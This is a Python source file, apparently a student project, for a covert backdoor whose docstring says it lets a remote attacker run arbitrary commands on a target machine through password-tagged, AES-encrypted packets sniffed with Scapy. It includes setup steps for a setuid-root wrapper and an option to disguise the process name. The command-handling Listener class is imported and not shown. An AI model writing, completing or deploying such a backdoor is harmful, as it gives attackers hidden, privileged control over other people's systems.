#!/bin/env python
from scapy.all import *
import getpass
import os
import argparse
from Listener import Listener
import procname
"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
''' Backdoor program that can allow a remote attacker to execute arbitrary commands on the target machine. 
''' Uses libpcap via Scapy to listen for packets directly on the NIC for either tcp or udp packets (user-
''' specified). Incoming packets are further filtered by source and destination ports and remote IP, as
''' specified by the user. After packets make it through the filter, they are checked again to ensure that
''' the payload of the packet contains a special password, indicating a command from the remote host. 
''' Packets that don't contain the password are discarded. Commands received in verified packets are 
''' executed in a subprocess and the response from the system is sent back to the remote host.
''' 
''' All communication between the backdoor and client is encrypted using AES encryption, with a key
''' password specified by the user. The key given at the backdoor must match the one given at the client.
'''
''' To run:
'''     The program can optionally be run with the help of wrapper.c, which enables setting the userid
'''     of the running process. This should be used if the program will be run by a user other than root.
'''
'''     The wrapper can be compiled with:
'''         gcc -o wrapper wrapper.c
'''     The following commands must also be run on the wrapper:
'''         chown root wrapper
'''         chmod u+s wrapper
'''     Then:
'''         ./wrapper bdoor.py -r remotehost -l localhost -s source_pot -d dest_port -p protocol -k key -n proc_name
'''     
'''     If the program is run without the wrapper:
'''         ./bdoor.py -r remotehost -l localhost -s source_pot -d dest_port -p protocol -k key -n proc_name
'''
'''
''' Author:  Wilson Carpenter - A00867197
''' Version: 1.0
''' Date: October 23, 2017
'''
"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""

VALID_PROTOS = ('tcp', 'udp')

def main():
    """
    Entry point for the backdoor program.
    :return:
    """
    #os.setuid(0)
    #os.seteuid(0)

    parser = argparse.ArgumentParser()

    parser.add_argument('-r', '--rhost', dest='rhost', required=True,
                        help='The IP address of the backdoor')
    parser.add_argument('-s', '--sport', dest='sport', required=True,
                       help='Source port')
    parser.add_argument('-d', '--dport', dest='dport', required=True,
                       help='Destination port')
    parser.add_argument('-p', '--proto', dest='proto', required=True,
                        help='Protocol to use: tcp or udp')
    parser.add_argument('-l', '--lhost', dest='lhost', required=True,
                       help='IP address of this machine')
    parser.add_argument('-k', '--key', dest='key', required=True,
                       help='Encryption key to use')
    parser.add_argument('-n', '--name',  dest='procname', required=False,
                       help='Name to mask the process as')
    args = parser.parse_args()

    procname.setprocname(args.procname)

    listener = Listener(args.rhost, args.lhost, args.sport, args.dport,
                        args.proto, args.key)
    print('listening')
    listener.listen()


if __name__ == '__main__':
    main()
